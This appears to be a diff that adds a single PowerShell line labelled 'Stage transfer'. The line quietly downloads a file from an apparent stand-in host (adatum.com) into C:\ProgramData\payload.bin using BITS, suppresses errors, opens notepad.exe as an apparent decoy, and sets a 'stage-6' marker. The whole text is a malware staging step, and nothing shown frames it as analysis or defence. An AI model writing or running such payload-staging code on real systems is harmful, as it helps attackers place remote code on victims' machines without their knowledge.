@@ -1,0 +1,1 @@
+<# Stage transfer #> $DownloadUrl = "http://adatum.com:80/update.dat"; $DropPath = "C:\ProgramData\payload.bin"; Start-BitsTransfer -Source $DownloadUrl -Destination $DropPath -ErrorAction SilentlyContinue; Start-Process -FilePath 'notepad.exe' -ErrorAction SilentlyContinue; $StageMarker = "stage-6"
